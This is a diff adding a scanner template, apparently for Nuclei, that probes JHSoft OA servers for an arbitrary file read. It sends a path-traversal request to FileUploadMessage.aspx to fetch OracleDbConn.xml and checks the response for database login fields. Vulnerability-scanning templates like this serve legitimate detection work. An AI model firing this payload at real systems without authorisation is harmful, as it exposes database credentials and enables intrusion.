@@ -1,0 +1,21 @@
+id: poc-yaml-jinher-oa-fileuploadmessage-aspx-anyfile-read
+info:
+  name: JHSoft OA FileUploadMessage.aspx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "xml"
+          - "<DbType>"
+          - "<DbLoginName>"
